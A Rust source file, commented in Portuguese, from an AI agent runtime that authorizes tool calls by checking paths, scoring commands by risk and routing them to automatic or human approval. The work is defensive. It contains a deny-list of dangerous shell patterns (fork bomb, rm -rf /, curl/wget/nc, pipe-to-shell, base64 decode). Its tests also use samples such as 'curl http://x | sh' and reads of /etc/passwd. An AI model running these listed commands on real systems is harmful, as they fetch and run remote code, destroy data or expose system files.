//! Autorizacao de ferramentas: avaliada pelo runtime, fora da LLM.

use std::path::{Component, Path, PathBuf};
use std::sync::Arc;

use dots_core::{DotsError, DotsResult, ExecutionEvent, RiskLevel, ToolPolicy};
use serde_json::Value;
use tokio::sync::mpsc;

#[derive(Debug, Clone)]
pub struct AuthorizedDir {
    pub path: PathBuf,
    pub can_read: bool,
    pub can_write: bool,
}

/// Contexto de uma execucao em andamento, visivel ao gateway pelo token.
pub struct ExecutionContext {
    pub token: String,
    pub execution_id: String,
    pub task_id: String,
    pub dot_id: String,
    pub dot_name: String,
    pub workspace: PathBuf,
    pub dirs: Vec<AuthorizedDir>,
    pub policy: ToolPolicy,
    /// Canal para injetar eventos (aprovacoes) no stream da execucao.
    pub events: mpsc::Sender<ExecutionEvent>,
}

pub type SharedContext = Arc<ExecutionContext>;

#[derive(Debug, Clone, PartialEq)]
pub enum Decision {
    Allow { risk: RiskLevel, resources: Vec<String>, summary: String },
    NeedsApproval { risk: RiskLevel, resources: Vec<String>, summary: String },
    Deny(String),
}

/// Normaliza sem exigir existencia: resolve `..` lexicamente apos ancorar no workspace.
fn lexical_absolute(base: &Path, p: &str) -> PathBuf {
    let raw = PathBuf::from(p);
    let joined = if raw.is_absolute() { raw } else { base.join(raw) };
    let mut out = PathBuf::new();
    for c in joined.components() {
        match c {
            Component::ParentDir => {
                out.pop();
            }
            Component::CurDir => {}
            other => out.push(other.as_os_str()),
        }
    }
    out
}

/// Canonicaliza o maior prefixo existente (para arquivos novos) e reanexa o resto.
fn canonical_best_effort(p: &Path) -> PathBuf {
    let mut existing = p.to_path_buf();
    let mut rest: Vec<std::ffi::OsString> = vec![];
    while !existing.exists() {
        match existing.file_name() {
            Some(n) => {
                rest.push(n.to_os_string());
                existing.pop();
            }
            None => break,
        }
    }
    let mut base = std::fs::canonicalize(&existing).unwrap_or(existing);
    for r in rest.iter().rev() {
        base.push(r);
    }
    base
}

impl ExecutionContext {
    /// Resolve um caminho e garante que esta dentro de um diretorio autorizado
    /// com a permissao pedida. Symlinks que apontem para fora sao negados.
    pub fn authorize_path(&self, input: &str, write: bool) -> DotsResult<PathBuf> {
        if input.trim().is_empty() {
            return Err(DotsError::Validation("caminho vazio".into()));
        }
        let lexical = lexical_absolute(&self.workspace, input);
        let resolved = canonical_best_effort(&lexical);
        for d in &self.dirs {
            let root = std::fs::canonicalize(&d.path).unwrap_or(d.path.clone());
            if resolved.starts_with(&root) {
                if write && !d.can_write {
                    return Err(DotsError::Unauthorized(format!("sem permissao de escrita em {}", d.path.display())));
                }
                if !write && !d.can_read {
                    return Err(DotsError::Unauthorized(format!("sem permissao de leitura em {}", d.path.display())));
                }
                if resolved.components().any(|c| c.as_os_str() == ".dots") {
                    return Err(DotsError::Unauthorized("diretorio interno .dots e reservado".into()));
                }
                return Ok(resolved);
            }
        }
        Err(DotsError::Unauthorized(format!("caminho fora dos diretorios autorizados: {}", lexical.display())))
    }

    /// Avalia uma chamada de ferramenta do gateway.
    pub fn evaluate(&self, tool: &str, input: &Value) -> Decision {
        let (risk, resources, summary) = match self.classify(tool, input) {
            Ok(x) => x,
            Err(e) => return Decision::Deny(e.message().to_string()),
        };
        if risk == RiskLevel::Critical {
            return Decision::NeedsApproval { risk, resources, summary };
        }
        if self.policy.auto_approve_level.covers(risk) {
            Decision::Allow { risk, resources, summary }
        } else {
            Decision::NeedsApproval { risk, resources, summary }
        }
    }

    fn classify(&self, tool: &str, input: &Value) -> DotsResult<(RiskLevel, Vec<String>, String)> {
        let s = |k: &str| input.get(k).and_then(|v| v.as_str()).unwrap_or("").to_string();
        if let Some(ft) = tool.strip_prefix("flexi_").and_then(|_| dots_flexi::find_tool(tool)) {
            let risk = crate::flexi::risk_of(ft);
            let ids = input.get("ids").map(|v| v.to_string()).or_else(|| input.get("id").map(|v| v.to_string())).unwrap_or_default();
            let summary = format!("Flexi: {} {}", ft.description.split('.').next().unwrap_or(ft.name), ids);
            return Ok((risk, vec![format!("flexi:{}", ft.path)], summary));
        }
        match tool {
            "dots_list_dir" | "dots_read_file" | "dots_search" => {
                let p = self.authorize_path(&s("path"), false)?;
                Ok((RiskLevel::Read, vec![p.to_string_lossy().into()], format!("{tool} {}", p.display())))
            }
            "dots_write_file" => {
                let p = self.authorize_path(&s("path"), true)?;
                let len = s("content").len() as u64;
                if len > self.policy.max_file_bytes {
                    return Err(DotsError::Unauthorized(format!("conteudo excede o limite de {} bytes", self.policy.max_file_bytes)));
                }
                Ok((RiskLevel::Write, vec![p.to_string_lossy().into()], format!("escrever {} ({len} bytes)", p.display())))
            }
            "dots_delete_file" => {
                let p = self.authorize_path(&s("path"), true)?;
                Ok((RiskLevel::Critical, vec![p.to_string_lossy().into()], format!("excluir {}", p.display())))
            }
            "dots_run_command" => {
                let cmd = s("command");
                let cwd = if s("cwd").is_empty() { self.workspace.clone() } else { self.authorize_path(&s("cwd"), false)? };
                let risk = classify_command(&cmd, &self.policy)?;
                Ok((risk, vec![cwd.to_string_lossy().into()], format!("executar `{cmd}` em {}", cwd.display())))
            }
            "dots_git" => {
                let op = s("op");
                let cwd = if s("cwd").is_empty() { self.workspace.clone() } else { self.authorize_path(&s("cwd"), false)? };
                let args: Vec<String> = input.get("args").and_then(|a| a.as_array()).map(|a| a.iter().filter_map(|x| x.as_str().map(String::from)).collect()).unwrap_or_default();
                let risk = match op.as_str() {
                    "status" | "diff" | "log" | "show" | "branch_list" | "remote" => RiskLevel::Read,
                    "add" | "commit" | "checkout" | "branch_create" | "stash" | "restore" => {
                        if args.iter().any(|a| a == "--hard" || a == "-f" || a == "--force") { RiskLevel::Critical } else { RiskLevel::Write }
                    }
                    "push" | "reset" | "clean" | "rebase" | "merge" | "tag" => RiskLevel::Critical,
                    other => return Err(DotsError::Validation(format!("operacao git desconhecida: {other}"))),
                };
                for a in &args {
                    if a.starts_with('-') && (a.contains("exec") || a == "-c" || a.starts_with("--upload-pack") || a.starts_with("--receive-pack")) {
                        return Err(DotsError::Unauthorized(format!("argumento git nao permitido: {a}")));
                    }
                }
                Ok((risk, vec![cwd.to_string_lossy().into()], format!("git {op} {} em {}", args.join(" "), cwd.display())))
            }
            "dots_system_info" => Ok((RiskLevel::Read, vec![], "informacoes do sistema".into())),
            "dots_checkpoint" => Ok((RiskLevel::Read, vec![], format!("checkpoint: {}", s("step")))),
            "dots_delegation_status" | "dots_list_team" => Ok((RiskLevel::Read, vec![], tool.to_string())),
            "dots_delegate" => Ok((RiskLevel::Read, vec![s("to")], format!("delegar a {}: {}", s("to"), s("request").chars().take(60).collect::<String>()))),
            "dots_cancel_delegation" => Ok((RiskLevel::Read, vec![s("id")], "cancelar delegacao".into())),
            "dots_ask_user" => Ok((RiskLevel::Read, vec![], format!("perguntar: {}", s("question").chars().take(60).collect::<String>()))),
            "dots_answer_question" => Ok((RiskLevel::Read, vec![], format!("responder ao funcionario: {}", s("answer").chars().take(60).collect::<String>()))),
            "dots_browser_open" => {
                if !self.policy.allow_network {
                    return Err(DotsError::Unauthorized("acesso a rede desabilitado para este DOT".into()));
                }
                let url = s("url");
                if !(url.starts_with("http://") || url.starts_with("https://")) {
                    return Err(DotsError::Validation("a URL deve comecar com http:// ou https://".into()));
                }
                Ok((RiskLevel::Exec, vec![url.clone()], format!("abrir no navegador: {}", url.chars().take(100).collect::<String>())))
            }
            "dots_remember" => Ok((RiskLevel::Write, vec![], format!("gravar memoria: {}", s("content").chars().take(60).collect::<String>()))),
            "dots_recall" => Ok((RiskLevel::Read, vec![], format!("buscar memoria: {}", s("query")))),
            other => Err(DotsError::Validation(format!("ferramenta desconhecida: {other}"))),
        }
    }

    /// Classifica uma ferramenta nativa do CLI (quando `engine_native_write`), para o `permission_prompt`.
    pub fn evaluate_native(&self, tool_name: &str, input: &Value) -> Decision {
        let s = |k: &str| input.get(k).and_then(|v| v.as_str()).unwrap_or("").to_string();
        let name = tool_name.trim_start_matches("mcp__");
        let result: DotsResult<(RiskLevel, Vec<String>, String)> = (|| match name {
            "Read" | "Glob" | "Grep" | "LS" | "NotebookRead" => {
                let p = s("file_path");
                let p = if p.is_empty() { s("path") } else { p };
                let resolved = if p.is_empty() { self.workspace.clone() } else { self.authorize_path(&p, false)? };
                Ok((RiskLevel::Read, vec![resolved.to_string_lossy().into()], format!("{name} {}", resolved.display())))
            }
            "Edit" | "Write" | "MultiEdit" | "NotebookEdit" => {
                let p = self.authorize_path(&s("file_path"), true)?;
                Ok((RiskLevel::Write, vec![p.to_string_lossy().into()], format!("{name} {}", p.display())))
            }
            "Bash" | "PowerShell" => {
                let cmd = s("command");
                let risk = classify_command(&cmd, &self.policy)?;
                Ok((risk, vec![self.workspace.to_string_lossy().into()], format!("comando `{cmd}`")))
            }
            "WebFetch" | "WebSearch" => {
                if self.policy.allow_network { Ok((RiskLevel::Exec, vec![s("url")], format!("{name} {}", s("url")))) } else { Err(DotsError::Unauthorized("acesso a rede desabilitado para este DOT".into())) }
            }
            "AskUserQuestion" | "TodoWrite" | "Task" | "Skill" | "EndConversation" => Ok((RiskLevel::Read, vec![], name.to_string())),
            other => Ok((RiskLevel::Critical, vec![], format!("ferramenta nativa {other}"))),
        })();
        match result {
            Err(e) => Decision::Deny(e.message().to_string()),
            Ok((risk, resources, summary)) => {
                if risk != RiskLevel::Critical && self.policy.auto_approve_level.covers(risk) {
                    Decision::Allow { risk, resources, summary }
                } else {
                    Decision::NeedsApproval { risk, resources, summary }
                }
            }
        }
    }
}

const READ_ONLY_PREFIXES: &[&str] = &[
    "ls", "cat ", "head ", "tail ", "wc ", "pwd", "echo ", "which ", "file ", "stat ", "du ", "df ", "date", "uname",
    "git status", "git log", "git diff", "git show", "git branch", "git remote -v", "grep ", "rg ", "find ", "tree",
    "cargo check", "cargo test", "cargo build", "npm test", "pnpm test", "npm run test", "pnpm run test", "pytest", "go test", "make test",
];
const DENY_PATTERNS: &[&str] = &[
    "sudo ", "su ", "rm -rf /", "rm -rf ~", "rm -rf *", "mkfs", ":(){", "> /dev/", "chmod -r 777", "chown -r", "launchctl", "osascript",
    "shutdown", "reboot", "diskutil", "dd if=", "curl ", "wget ", "nc ", "ssh ", "scp ", "rsync ", "open ", "defaults write", "security ",
    "kill -9 -1", "pkill ", "killall ", "crontab", "| sh", "| bash", "|sh", "|bash", "eval ", "base64 -d", "python -c", "python3 -c", "perl -e", "ruby -e", "node -e",
];
const NETWORK_HINTS: &[&str] = &["npm install", "pnpm install", "pip install", "cargo install", "brew ", "git push", "git fetch", "git pull", "git clone", "apt ", "gem install", "go get"];

/// Classifica um comando shell segundo denylist global, allowlist do DOT e conjunto somente-leitura.
pub fn classify_command(cmd: &str, policy: &ToolPolicy) -> DotsResult<RiskLevel> {
    let c = cmd.trim();
    if c.is_empty() {
        return Err(DotsError::Validation("comando vazio".into()));
    }
    let lower = c.to_lowercase();
    for d in DENY_PATTERNS {
        if lower.contains(d) || lower.starts_with(d.trim()) {
            return Err(DotsError::Unauthorized(format!("comando bloqueado pela politica global: `{}`", d.trim())));
        }
    }
    if lower.contains(" -delete") || lower.contains(" -exec") {
        return Err(DotsError::Unauthorized("find com -delete/-exec nao e permitido".into()));
    }
    let is_network = NETWORK_HINTS.iter().any(|h| lower.contains(h));
    if is_network && !policy.allow_network {
        return Err(DotsError::Unauthorized("comando exige rede e o DOT nao tem rede habilitada".into()));
    }
    // Comandos encadeados herdam o maior risco; separadores de shell exigem allowlist explicita.
    let chained = lower.contains("&&") || lower.contains("||") || lower.contains(';') || lower.contains('|') || lower.contains('`') || lower.contains("$(");
    if policy.allowed_commands.iter().any(|p| !p.is_empty() && (lower == p.to_lowercase() || lower.starts_with(&format!("{} ", p.to_lowercase())))) {
        return Ok(RiskLevel::Exec);
    }
    if !chained && READ_ONLY_PREFIXES.iter().any(|p| lower == p.trim() || lower.starts_with(p)) {
        return Ok(RiskLevel::Read);
    }
    Err(DotsError::Unauthorized(format!("comando nao esta na lista permitida do DOT: `{c}`")))
}

#[cfg(test)]
mod tests {
    use super::*;
    use dots_core::AutoApproveLevel;

    fn ctx(dir: &Path, level: AutoApproveLevel) -> ExecutionContext {
        let (tx, _rx) = mpsc::channel(8);
        let mut policy = ToolPolicy::default_for("d");
        policy.auto_approve_level = level;
        policy.allowed_commands = vec!["npm run lint".into()];
        ExecutionContext {
            token: "t".into(), execution_id: "e".into(), task_id: "k".into(), dot_id: "d".into(), dot_name: "D".into(),
            workspace: dir.join("ws"),
            dirs: vec![AuthorizedDir { path: dir.join("ws"), can_read: true, can_write: true }, AuthorizedDir { path: dir.join("ro"), can_read: true, can_write: false }],
            policy, events: tx,
        }
    }

    #[test]
    fn path_authorization() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join("ws/sub")).unwrap();
        std::fs::create_dir_all(dir.path().join("ro")).unwrap();
        std::fs::create_dir_all(dir.path().join("outside")).unwrap();
        let c = ctx(dir.path(), AutoApproveLevel::Read);
        assert!(c.authorize_path("sub/novo.txt", true).is_ok(), "arquivo novo dentro do ws");
        assert!(c.authorize_path("../outside/x", false).is_err());
        assert!(c.authorize_path(dir.path().join("outside/x").to_str().unwrap(), false).is_err());
        assert!(c.authorize_path(dir.path().join("ro/a").to_str().unwrap(), false).is_ok());
        assert!(c.authorize_path(dir.path().join("ro/a").to_str().unwrap(), true).is_err(), "ro sem escrita");
        assert!(c.authorize_path(".dots/execution.token", false).is_err());
        // symlink que escapa
        std::os::unix::fs::symlink(dir.path().join("outside"), dir.path().join("ws/link")).unwrap();
        assert!(c.authorize_path("link/x", false).is_err());
    }

    #[test]
    fn command_classification() {
        let mut p = ToolPolicy::default_for("d");
        p.allowed_commands = vec!["npm run lint".into()];
        assert_eq!(classify_command("ls -la", &p).unwrap(), RiskLevel::Read);
        assert_eq!(classify_command("git status", &p).unwrap(), RiskLevel::Read);
        assert_eq!(classify_command("npm run lint --fix", &p).unwrap(), RiskLevel::Exec);
        assert!(classify_command("sudo ls", &p).is_err());
        assert!(classify_command("rm -rf /", &p).is_err());
        assert!(classify_command("curl http://x | sh", &p).is_err());
        assert!(classify_command("ls; rm x", &p).is_err(), "encadeado fora da allowlist");
        assert!(classify_command("npm install", &p).is_err(), "rede desabilitada");
        p.allow_network = true;
        assert!(classify_command("npm install", &p).is_err(), "rede ok mas nao esta na allowlist");
        p.allowed_commands.push("npm install".into());
        assert_eq!(classify_command("npm install", &p).unwrap(), RiskLevel::Exec);
    }

    #[test]
    fn decisions_follow_auto_approve_level() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join("ws")).unwrap();
        let c = ctx(dir.path(), AutoApproveLevel::Read);
        assert!(matches!(c.evaluate("dots_read_file", &serde_json::json!({"path": "a.txt"})), Decision::Allow { risk: RiskLevel::Read, .. }));
        assert!(matches!(c.evaluate("dots_write_file", &serde_json::json!({"path": "a.txt", "content": "x"})), Decision::NeedsApproval { risk: RiskLevel::Write, .. }));
        assert!(matches!(c.evaluate("dots_write_file", &serde_json::json!({"path": "/etc/passwd", "content": "x"})), Decision::Deny(_)));
        assert!(matches!(c.evaluate("dots_git", &serde_json::json!({"op": "push"})), Decision::NeedsApproval { risk: RiskLevel::Critical, .. }));
        assert!(matches!(c.evaluate("dots_run_command", &serde_json::json!({"command": "sudo rm"})), Decision::Deny(_)));
        let c2 = ctx(dir.path(), AutoApproveLevel::Exec);
        assert!(matches!(c2.evaluate("dots_run_command", &serde_json::json!({"command": "npm run lint"})), Decision::Allow { risk: RiskLevel::Exec, .. }));
        assert!(matches!(c2.evaluate("dots_delete_file", &serde_json::json!({"path": "a"})), Decision::NeedsApproval { risk: RiskLevel::Critical, .. }));
        // nativas do Claude
        assert!(matches!(c2.evaluate_native("Write", &serde_json::json!({"file_path": "b.txt"})), Decision::Allow { .. }));
        assert!(matches!(c2.evaluate_native("Write", &serde_json::json!({"file_path": "/tmp/fora"})), Decision::Deny(_)));
        assert!(matches!(c2.evaluate_native("WebFetch", &serde_json::json!({"url": "http://x"})), Decision::Deny(_)));
        // navegador: exige rede liberada; risco Exec; so http/https
        assert!(matches!(c2.evaluate("dots_browser_open", &serde_json::json!({"url": "https://x"})), Decision::Deny(_)), "rede desabilitada");
        let mut c3 = ctx(dir.path(), AutoApproveLevel::Exec);
        c3.policy.allow_network = true;
        assert!(matches!(c3.evaluate("dots_browser_open", &serde_json::json!({"url": "https://x"})), Decision::Allow { risk: RiskLevel::Exec, .. }));
        assert!(matches!(c3.evaluate("dots_browser_open", &serde_json::json!({"url": "file:///etc/passwd"})), Decision::Deny(_)));
        let mut c4 = ctx(dir.path(), AutoApproveLevel::Write);
        c4.policy.allow_network = true;
        assert!(matches!(c4.evaluate("dots_browser_open", &serde_json::json!({"url": "https://x"})), Decision::NeedsApproval { risk: RiskLevel::Exec, .. }));
    }
}
